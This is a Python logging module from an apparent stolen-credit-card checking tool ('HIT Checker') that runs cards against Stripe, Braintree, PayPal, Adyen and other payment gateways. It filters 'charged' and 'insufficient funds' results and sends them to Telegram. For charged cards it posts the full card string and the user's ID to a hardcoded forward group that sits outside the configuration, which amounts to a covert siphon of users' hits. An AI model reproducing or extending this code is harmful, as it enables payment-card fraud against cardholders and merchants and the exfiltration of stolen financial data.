import sys
import json
import os
import requests

GATEWAY_NAMES = {
    "st": "Stripe Auth $0",
    "skl": "Stripe Auth $0.1",
    "b3": "Braintree Auth",
    "vbv": "VBV Lookup",
    "an": "Authorize.net Auth",
    "skb": "SK Base Auth $0",
    "adn": "Adyen Auth",
    "rbc": "Stripe Auth $0 (RBC)",
    "cw": "Stripe Charge $6",
    "rz": "Razorpay Charge",
    "charge": "Stripe Charge SK",
    "pp": "PayPal Charge $0.01",
    "shp": "Shopify",
    "skl1": "Stripe Charge $1",
    "skl2": "Stripe Charge $7",
    "b3c": "Braintree Charge",
    "ppn": "PayPal Charge $1",
    "bnc": "PayPal Charge $1",
    "ch": "Stripe Charge \u20ac5",
    "isp": "Stripe Charge $25",
    "auto": "Stripe Random Charge",
    "azz": "Authorize.net Charge $1",
    "ppk": "PayPal Keybase $1",
    "Stripe CO": "Stripe Checkout",
}

HIT_FORWARD_GROUP = -1003561084296

_bot_username_cache = {}

def get_bot_username(bot_token):
    if bot_token in _bot_username_cache:
        return _bot_username_cache[bot_token]
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
        data = resp.json()
        if data.get("ok"):
            username = data["result"].get("username", "HitBot")
            _bot_username_cache[bot_token] = username
            return username
    except Exception:
        pass
    return "HitBot"

def send_group_log(user_name, user_id, card, gateway, response_msg, log_type="checker", site="", amount=""):
    config_path = os.path.join(os.path.dirname(__file__), "config.json")
    try:
        with open(config_path, "r") as f:
            config = json.load(f)
    except Exception:
        print(json.dumps({"sent": False, "error": "Config not found"}))
        return

    bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
    group_id = config.get("TELEGRAM_GROUP_ID", "")
    admin_id = config.get("TELEGRAM_ADMIN_ID", "")
    if not bot_token or not group_id:
        print(json.dumps({"sent": False, "error": "No bot token or group ID"}))
        return

    def escape_md(s):
        for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
            s = s.replace(ch, '\\' + ch)
        return s

    gate_display = GATEWAY_NAMES.get(gateway, gateway)
    if log_type == "auto_hitter":
        gate_display = "Stripe Checkout Hitter"

    status_lower = response_msg.lower()
    is_charged = "charged" in status_lower or "approved" in status_lower
    is_insuff = "insufficient" in status_lower or "insuff" in status_lower

    if not (is_charged or is_insuff):
        print(json.dumps({"sent": False, "reason": "Not a hit response"}))
        return

    bot_username = get_bot_username(bot_token)

    display_name = user_name or user_id

    if log_type == "auto_hitter":
        code_lines = [
            f"\U0001f525 HIT DETECTED \u26a1",
            f"\U0001f464 {display_name}",
            f"\u2194\ufe0f Gateway: {gate_display}",
            f"\u2705 Response: {response_msg}",
        ]
        if site:
            code_lines.append(f"\U0001f310 Site: {site}")
        if amount:
            code_lines.append(f"\U0001f4b0 Amount: {amount}")
        code_block = "\n".join(code_lines)
        text = f"```\n{escape_md(code_block)}\n```\n[Open HIT Checker](https://t.me/{bot_username}/web)"
    else:
        code_lines = [
            f"\U0001f525 HIT DETECTED \u26a1",
            f"\U0001f464 {display_name}",
            f"\u2194\ufe0f Gateway: {gate_display}",
            f"\u2705 Response: {response_msg}",
        ]
        code_block = "\n".join(code_lines)
        text = f"```\n{escape_md(code_block)}\n```\n[Open HIT Checker](https://t.me/{bot_username}/web)"

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        resp = requests.post(url, json={
            "chat_id": int(group_id),
            "text": text,
            "parse_mode": "MarkdownV2",
            "disable_web_page_preview": True,
        }, timeout=10)
        result = resp.json()
        print(json.dumps({"sent": result.get("ok", False)}))
    except Exception as e:
        print(json.dumps({"sent": False, "error": str(e)}))

    if is_charged and log_type != "auto_hitter":
        try:
            cc_num = card.split("|")[0].strip() if "|" in card else card
            bin_info = cc_num[:6] if len(cc_num) >= 6 else cc_num
            hit_msg = (
                f"\U0001f525 **CHARGED**\n"
                f"**Card:** `{card}`\n"
                f"**Response:** {response_msg}\n"
                f"**Gateway:** {gate_display}\n"
                f"**BIN:** {bin_info}\n"
                f"**Checked By:** [{user_name or user_id}](tg://user?id={user_id})"
            )

            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": HIT_FORWARD_GROUP,
                "text": hit_msg,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True,
            }, timeout=10)
        except Exception:
            pass

    if log_type == "auto_hitter" and is_charged and admin_id:
        try:
            admin_msg = (
                f"\U0001f525\U0001f525 **Stripe CO Hit** \U0001f525\U0001f525\n"
                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
                f"\U0001f4b3 **Card:** `{card}`\n"
                f"\u26a1 **Gateway:** {gate_display}\n"
                f"\u2705 **Response:** {response_msg}\n"
            )
            if site:
                admin_msg += f"\U0001f310 **Site:** {site}\n"
            if amount:
                admin_msg += f"\U0001f4b0 **Amount:** {amount}\n"
            admin_msg += (
                f"\U0001f464 **User:** [{user_name or user_id}](tg://user?id={user_id})\n"
                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
            )
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": int(admin_id),
                "text": admin_msg,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True,
            }, timeout=10)
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print(json.dumps({"sent": False, "error": "Usage: web_group_log.py <user_name> <user_id> <card> <gateway> <response> [log_type] [site] [amount]"}))
        sys.exit(1)

    log_type = sys.argv[6] if len(sys.argv) > 6 else "checker"
    site = sys.argv[7] if len(sys.argv) > 7 else ""
    amount = sys.argv[8] if len(sys.argv) > 8 else ""
    send_group_log(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], log_type, site, amount)
